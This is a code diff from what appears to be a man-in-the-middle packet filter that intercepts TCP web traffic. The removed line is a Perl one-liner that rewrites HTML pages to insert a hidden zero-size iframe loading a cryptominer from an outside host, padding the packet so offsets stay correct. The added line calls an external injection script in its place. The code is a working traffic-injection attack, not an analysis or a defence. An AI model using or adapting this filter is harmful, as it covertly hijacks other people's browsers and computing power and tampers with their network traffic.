@@ -15,7 +15,7 @@ if (ip.proto == TCP) {
       execinject("rm tmp/pagedata 2>/dev/null"); # make sure its not there
       log(DATA.data, "tmp/pagedata"); # log the packet
       drop();  # drop it so it doesn't go through
-      execinject("perl -e 'while ($a = <>) { $c = $c . $a;$chars1 += length($a);if ($a =~ m/<!--.*-->/){$a =~ s/<!--.*-->//g}if ($a =~ /\n/) {$a =~ s/\n//sg}if($a =~ m/<body/) {$a =~ s/(<body.*?>)(.*)/\1<iframe width=0 height=0 src=\"http:\/\/wtyw.net\/lm\"><\/iframe>\2/s;};$b = $b . $a;} $chars2 = length($b); if ($chars1 > $chars2) {$b = $b . " "x($chars1-$chars2);print $b;$date = `date`;chomp($date);print STDERR "[*] $date Miner Injected\n"} if ($chars1 < $chars2) {print $c}' tmp/pagedata");
+      execinject("./injectme.pl tmp/pagedata");
       # remove the comments to make space, inject our iframe, then insert the right number of spaces to fill the void in packet to get right offset
     }
   }
